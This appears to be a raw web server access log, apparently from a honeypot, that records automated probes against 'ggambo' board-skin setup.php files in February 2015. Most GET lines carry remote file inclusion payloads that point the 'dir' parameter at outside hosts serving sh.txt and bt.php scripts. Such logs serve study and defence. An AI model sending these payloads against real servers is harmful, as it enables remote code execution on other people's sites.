1.224.163.80 - - [15/Feb/2015:08:21:27 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [15/Feb/2015:08:21:28 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [15/Feb/2015:08:21:29 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
176.31.252.38 - - [15/Feb/2015:08:21:57 -0800] "GET /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:08:21:58 -0800] "GET /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:08:21:59 -0800] "POST /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:08:22:00 -0800] "POST /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:08:22:00 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:08:22:01 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:08:22:01 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:08:22:02 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
181.65.186.35 - - [15/Feb/2015:08:22:15 -0800] "GET /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [15/Feb/2015:08:22:16 -0800] "GET /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [15/Feb/2015:08:22:16 -0800] "POST /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [15/Feb/2015:08:22:17 -0800] "POST /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [15/Feb/2015:08:22:18 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
176.31.252.38 - - [15/Feb/2015:08:22:19 -0800] "GET /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
181.65.186.35 - - [15/Feb/2015:08:22:19 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [15/Feb/2015:08:22:19 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
176.31.252.38 - - [15/Feb/2015:08:22:20 -0800] "GET /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:08:22:20 -0800] "POST /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
181.65.186.35 - - [15/Feb/2015:08:22:21 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
176.31.252.38 - - [15/Feb/2015:08:22:21 -0800] "POST /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:08:22:21 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:08:22:23 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:08:22:23 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:08:22:24 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
71.6.150.241 - - [15/Feb/2015:08:30:07 -0800] "GET /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:07 -0800] "GET /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:08 -0800] "GET /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:08 -0800] "GET /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:08 -0800] "POST /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:08 -0800] "POST /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:09 -0800] "POST /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:09 -0800] "POST /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:09 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:09 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:10 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:10 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:10 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:10 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:12 -0800] "POST ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
71.6.150.241 - - [15/Feb/2015:08:30:12 -0800] "POST ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
98.240.36.109 - - [15/Feb/2015:08:31:11 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
176.31.252.38 - - [15/Feb/2015:08:32:58 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
112.218.68.155 - - [15/Feb/2015:08:32:58 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [15/Feb/2015:08:32:59 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [15/Feb/2015:08:32:59 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [15/Feb/2015:08:33:00 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
112.218.68.155 - - [15/Feb/2015:08:33:00 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [15/Feb/2015:08:33:01 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [15/Feb/2015:08:33:01 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
112.218.68.155 - - [15/Feb/2015:08:33:02 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [15/Feb/2015:08:33:03 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [15/Feb/2015:08:33:03 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [15/Feb/2015:08:33:04 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
71.6.150.241 - - [15/Feb/2015:08:33:12 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [15/Feb/2015:08:33:13 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [15/Feb/2015:08:33:13 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [15/Feb/2015:08:33:15 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
1.224.163.80 - - [15/Feb/2015:08:33:20 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [15/Feb/2015:08:33:22 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [15/Feb/2015:08:33:22 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [15/Feb/2015:08:33:23 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [15/Feb/2015:08:34:10 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [15/Feb/2015:08:34:11 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [15/Feb/2015:08:34:12 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [15/Feb/2015:08:34:13 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [15/Feb/2015:08:34:16 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [15/Feb/2015:08:34:17 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [15/Feb/2015:08:34:18 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [15/Feb/2015:08:34:19 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [15/Feb/2015:08:34:22 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
211.47.181.38 - - [15/Feb/2015:08:34:23 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [15/Feb/2015:08:34:24 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [15/Feb/2015:08:34:24 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
211.47.181.38 - - [15/Feb/2015:08:34:24 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
211.47.181.38 - - [15/Feb/2015:08:34:25 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [15/Feb/2015:08:34:26 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
211.47.181.38 - - [15/Feb/2015:08:34:26 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
211.47.181.38 - - [15/Feb/2015:08:34:27 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
211.47.181.38 - - [15/Feb/2015:08:34:29 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
1.224.163.80 - - [15/Feb/2015:08:34:29 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6" 
211.47.181.38 - - [15/Feb/2015:08:34:30 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
1.224.163.80 - - [15/Feb/2015:08:34:30 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6" 
1.224.163.80 - - [15/Feb/2015:08:34:31 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6" 
211.47.181.38 - - [15/Feb/2015:08:34:32 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
1.224.163.80 - - [15/Feb/2015:08:34:32 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6" 
211.47.181.38 - - [15/Feb/2015:08:34:40 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
211.47.181.38 - - [15/Feb/2015:08:34:42 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
211.47.181.38 - - [15/Feb/2015:08:34:42 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
211.47.181.38 - - [15/Feb/2015:08:34:44 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
180.179.212.185 - - [15/Feb/2015:08:35:24 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
180.179.212.185 - - [15/Feb/2015:08:35:26 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
180.179.212.185 - - [15/Feb/2015:08:35:26 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
180.179.212.185 - - [15/Feb/2015:08:35:28 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
181.65.186.35 - - [15/Feb/2015:08:35:29 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
181.65.186.35 - - [15/Feb/2015:08:35:30 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
181.65.186.35 - - [15/Feb/2015:08:35:31 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
181.65.186.35 - - [15/Feb/2015:08:35:32 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
180.179.212.185 - - [15/Feb/2015:08:36:11 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
180.179.212.185 - - [15/Feb/2015:08:36:16 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
180.179.212.185 - - [15/Feb/2015:08:36:16 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
180.179.212.185 - - [15/Feb/2015:08:36:18 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
211.47.181.38 - - [15/Feb/2015:08:36:38 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
211.47.181.38 - - [15/Feb/2015:08:36:39 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
211.47.181.38 - - [15/Feb/2015:08:36:40 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
